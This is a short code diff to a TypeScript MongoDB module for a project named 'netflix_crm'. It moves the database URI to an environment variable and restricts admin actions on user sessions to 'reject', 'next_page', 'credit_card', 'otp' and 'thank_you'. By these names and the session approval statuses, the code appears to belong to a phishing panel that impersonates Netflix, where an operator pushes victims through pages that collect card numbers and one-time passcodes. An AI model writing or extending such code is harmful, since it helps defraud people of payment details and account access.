@@ -1,6 +1,7 @@
-import { MongoClient, Db, Collection } from "mongodb";
+import { MongoClient, Db } from "mongodb";
 
-const MONGODB_URI = "YOUR_MONGODB_URL/netflix_crm";
+const MONGODB_URI =
+  process.env.MONGODB_URI || "mongodb://localhost:27017/netflix_crm";
 
 if (!MONGODB_URI) {
   throw new Error("Please define the MONGODB_URI environment variable");
@@ -173,7 +174,7 @@ export async function updateUserSessionStatus(
   sessionId: string,
   updates: {
     status?: "pending" | "approved" | "rejected";
-    adminAction?: string;
+    adminAction?: "reject" | "next_page" | "credit_card" | "otp" | "thank_you";
     rejectionReason?: string;
   }
 ): Promise<UserSession | null> {
